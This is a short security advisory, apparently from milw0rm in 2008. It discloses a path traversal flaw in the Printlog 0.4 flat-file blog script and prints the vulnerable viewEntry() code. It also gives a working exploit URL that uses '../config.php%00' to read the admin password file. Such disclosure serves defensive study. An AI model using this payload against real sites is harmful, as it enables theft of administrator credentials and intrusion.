@@ -1,0 +1,39 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Printlog <= 0.4: Remote File Edition Vulnerability
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+$ Program: Printlog
+$ File affected: index.php
+$ Version: 0.4
+$ Download: http://www.hardkap.net/pritlog
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+-- Description (by the author's page) --
+PRITLOG is an extremely simple, small and powerful blog system. It does not 
+use or need a MYSQL database and fully works based on flat files. The idea 
+is derived from a similar app called PPLOG.
+
+-- Bug --
+You can navigate and see the entries. Something like as:
+  http://localhost/p/index.php?option=viewEntry&filename=00001
+
+Code doesn't check the comments directory:
+
+709.  function viewEntry() {
+710.	$fileName   = isset($_POST['filename'])?$_POST['filename']:$_GET['filename'];
+711.	global $postdir, $separator, $newPostFile, $newFullPostNumber, $debugMode, $config_textAreaCols, $config_textAreaRows;
+712.	global $config_allowComments, $config_commentsSecurityCode, $config_CAPTCHALength, $config_randomString;
+713.	global $commentdir,$config_dbFilesExtension, $config_onlyNumbersOnCAPTCHA;
+714.	$viewFileName=$postdir.$fileName.$config_dbFilesExtension;
+
+
+-- Exploit --
+If magic quotes are off you can do:
+  http://localhost/p/index.php?option=viewEntry&filename=../config.php%00
+
+config.php has the admin password
+
+# milw0rm.com [2008-09-30]
